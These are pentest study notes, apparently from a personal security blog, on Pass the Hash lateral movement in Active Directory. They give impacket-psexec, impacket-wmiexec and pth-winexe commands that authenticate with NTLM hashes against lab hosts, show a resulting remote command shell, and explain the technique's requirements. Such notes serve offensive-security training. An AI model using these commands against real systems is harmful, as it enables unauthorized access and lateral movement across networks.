---
description: >-
  Pass The Hash
title: Pass The Hash              # Add title here
date: 2023-02-08 08:00:00 -0600                           # Change the date to match completion date
categories: [12 Active Directory, Lateral Movement]             # Change Templates to Writeup
tags: [active directory, lateral movement, pass the hash]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---
> To extract hashes for a pass the hash, go to [Dumping SAM](https://shuciran.github.io/posts/Dumping-SAM/) section or [DCSync](https://shuciran.github.io/posts/DCSync/) section.
{: .prompt-tip }

### Impacket-psexec
You can use impacket-psexec to pass the hash into winrm service:
```bash
impacket-psexec offsec.local/Administrator:@192.168.143.59 -hashes aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5
```
Examples:
[Sizzle](https://shuciran.github.io/posts/Sizzle/#fnref:impacket-psexec)
[[Sauna#^]]
### Impacket-wmiexec
```bash
impacket-wmiexec htb.local/Administrator@10.10.10.103 -hashes :f6b7160bfc91823792e0ac3a162c9267
```
Examples:
[Sizzle](https://shuciran.github.io/posts/Sizzle/#fnref:impacket-wmiexec)

### PtH
We can use _pth-winexe_ from the Passing-The-Hash toolkit, just as we did when we passed the hash to a non-domain joined user in the Password Attacks module:
```
kali@kali:~$ pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
Microsoft Windows [Version 10.0.16299.309]
(c) 2017 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

### Explanation
The _Pass the Hash_ (PtH) technique allows an attacker to authenticate to a remote system or service using a user's NTLM hash instead of the associated plaintext password. Note that this will not work for Kerberos authentication but only for server or service using NTLM authentication.

Many third-party tools and frameworks use PtH to allow users to both authenticate and obtain code execution, including PsExec from Metasploit, Passing-the-hash toolkit, and [Impacket](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbclient.py). The mechanics behind them are more or less the same in that the attacker connects to the victim using the Server Message Block (SMB) protocol and performs authentication using the NTLM hash.

Most tools built to exploit PtH create and start a Windows service (for example cmd.exe or an instance of PowerShell) and communicate with it using _Named Pipes_. This is done using the Service Control ManagerAPI.

This technique requires an SMB connection through the firewall (commonly port 445), and the Windows _File and Print Sharing_ feature to be enabled. These requirements are common in internal enterprise environments.

When a connection is performed, it normally uses a special admin share called Admin$. In order to establish a connection to this share, the attacker must present valid credentials with local administrative permissions. In other words, this type of lateral movement typically requires local administrative rights.

Note that PtH uses the NTLM hash legitimately. However, the vulnerability lies in the fact that we gained unauthorized access to the password hash of a local administrator.



